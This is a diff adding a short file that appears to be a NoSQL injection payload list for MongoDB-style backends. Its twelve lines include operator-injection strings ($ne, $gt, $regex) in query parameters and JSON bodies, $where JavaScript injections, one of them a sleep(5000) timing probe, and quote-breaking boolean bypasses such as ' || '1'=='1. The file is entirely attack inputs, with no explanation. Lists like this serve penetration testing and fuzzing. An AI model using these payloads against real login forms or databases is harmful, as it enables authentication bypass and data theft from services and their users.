@@ -1,0 +1,12 @@
+login[$ne]=1&pass[$ne]=1
+?username[$gt]=&password[$gt]=
+{"password":{"$ne":""}}
+{"user":{"$regex":"^a"}}
+user[$where]=admin
+' || '1'=='1
+'||1==1
+admin'; return this.a; var x='
+{$ne:1}
+?search=$regex
+db.users.find({$where:"sleep(5000)"})
+mark[$where]=function(){return true}
